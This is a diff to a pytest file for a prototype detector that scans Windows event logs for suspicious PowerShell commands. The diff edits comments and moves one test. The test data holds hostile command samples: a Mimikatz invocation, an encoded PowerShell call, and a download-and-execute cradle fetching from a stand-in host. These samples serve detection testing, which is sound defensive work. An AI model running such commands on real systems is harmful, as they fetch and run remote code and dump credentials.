@@ -5,10 +5,10 @@ import pytest
 # the id and time. Afterwards, it checks if the command is part of suspicious commands rulebook
 
 # To check the function, the test bellow were created.
-# fake_event creates a fake log taken from real data when a startup is made
+# Fake_event creates a fake log taken from real data when a startup is made
 # However, some areas of the log have been taken out for brevity and simplicity, they however do not affect the script in any way.
 
-# Creating the file
+# Creating the fake event
 def fake_event(cmd,time='"2026-10-09 10:43:19.7561195Z"',record=0):
     return f'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
   <System>
@@ -65,7 +65,7 @@ def fake_log(monkeypatch):
     return events
 
 
-# first, checking the all the variables gain the correct values by testing a known trigger
+# First, checking the all the variables gain the correct values by testing a known trigger
 def test_encoded(fake_log):
     fake_log.append(fake_event("powershell -enc SGHSAavJyq"))
 
@@ -78,7 +78,7 @@ def test_encoded(fake_log):
     assert result[0]["Event ID"] == "0"
     assert result[0]["Timestamp (UTC)"] == "2026-10-09 10:43:19"
 
-# test multiple commands, including ones that create a high risk score from multiple rules in one command
+# Test multiple commands, including ones that create a high risk score from multiple rules in one command
 @pytest.mark.parametrize("command, expected_risk",
                          [("Invoke-Mimikatz", "High"),
                           ('powershell -exec Bypass -NoProfile -c "(New-Object Net.WebClient).DownloadString("https://testexample.co") | IEX', 'High'),
@@ -91,12 +91,7 @@ def test_risk_score(fake_log, command, expected_risk):
 
     assert result[0]["Risk Level"] == expected_risk
 
-# Test non suspicious code
-def test_non_suspicious_code(fake_log):
-    fake_log.append(fake_event("cd .\\Users\\vboxuser\\Desktop\\Final"))
-    assert prototype.pattern_reader() == []
-
-# Test multipe logs, some suspicious some not, script should only bring back suspicious one
+# Test multipe events, some suspicious some not, script should only bring back suspicious one
 def test_multiple(fake_log):
     fake_log.append(fake_event("cd .\\Users\\vboxuser\\Desktop\\Final",record= 1))
     fake_log.append(fake_event("powershell -enc SGHSAavJyq",record= 2))
@@ -107,7 +102,12 @@ def test_multiple(fake_log):
     assert len(result) == 1
     assert result[0]["Event ID"] == "2"
 
-# Test empty log
+# Test non suspicious code
+def test_non_suspicious_code(fake_log):
+    fake_log.append(fake_event("cd .\\Users\\vboxuser\\Desktop\\Final"))
+    assert prototype.pattern_reader() == []
+
+# Test empty event
 def test_empty(fake_log):
     fake_log.append(fake_event(""))
     assert prototype.pattern_reader() == []
@@ -121,4 +121,4 @@ def test_no_time_no_id(fake_log):
     assert prototype.pattern_reader()[0]["Event ID"] == "unknown"
 
 
-# All tests have passed
+# All Test Passed
